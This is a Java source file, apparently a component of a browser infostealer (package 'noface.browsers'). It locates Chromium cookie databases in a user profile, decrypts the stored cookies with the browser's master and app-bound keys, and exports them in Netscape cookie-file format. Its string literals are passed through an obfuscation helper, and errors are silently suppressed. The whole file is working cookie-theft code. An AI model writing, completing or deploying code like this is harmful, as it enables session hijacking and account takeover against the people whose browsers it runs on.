package noface.browsers;

import noface.config.S;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public final class Cookie {

    public record Entry(String host, String name, String value, String path, long expires, boolean secure, boolean httpOnly) {}

    private static String sql() {
        return S.e("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies");
    }

    public static List<Entry> pull(Profile profile) {
        List<Entry> out = new ArrayList<>();
        if (profile.masterKey() == null && profile.abeKey() == null) return out;
        Path net = profile.dir().resolve(S.e("Network/Cookies"));
        Path leg = profile.dir().resolve(S.e("Cookies"));
        if (Files.isRegularFile(net)) Db.query(net, sql(), rs -> add(rs, profile, out));
        if (out.isEmpty() && Files.isRegularFile(leg)) Db.query(leg, sql(), rs -> add(rs, profile, out));
        return out;
    }

    private static void add(java.sql.ResultSet rs, Profile profile, List<Entry> out) {
        try {
            String host = rs.getString(1);
            String name = rs.getString(2);
            byte[] enc = rs.getBytes(3);
            String path = rs.getString(4);
            long expires = rs.getLong(5);
            if (enc == null || enc.length == 0) return;

            long exp = 1893456000L;
            if (expires > 0) exp = (expires / 1000000L) - 11644473600L;
            if (exp < 0) exp = 1893456000L;

            boolean secure = false, httpOnly = false;
            try { secure = rs.getBoolean(6); } catch (Exception ignored) {}
            try { httpOnly = rs.getBoolean(7); } catch (Exception ignored) {}

            String value = Aes.decryptCookie(enc, profile.masterKey(), profile.abeKey(), host);
            if (value == null || value.isEmpty()) return;

            out.add(new Entry(n(host), n(name), value, path == null || path.isEmpty() ? S.e("/") : path, exp, secure, httpOnly));
        } catch (Exception ignored) {}
    }

    public static String netscape(List<Entry> cookies) {
        StringBuilder sb = new StringBuilder();
        sb.append(S.e("# Netscape HTTP Cookie File\n\n"));
        for (Entry c : cookies) {
            String val = c.value().trim();
            if (val.isEmpty()) continue;
            boolean sub = c.host().startsWith(".");
            sb.append(c.host()).append('\t')
              .append(sub ? S.e("TRUE") : S.e("FALSE")).append('\t')
              .append(c.path()).append('\t')
              .append(c.secure() ? S.e("TRUE") : S.e("FALSE")).append('\t')
              .append(c.expires()).append('\t')
              .append(c.name()).append('\t')
              .append(val).append('\n');
        }
        return sb.toString();
    }

    private static String n(String s) { return s == null ? "" : s; }

    private Cookie() {}
}
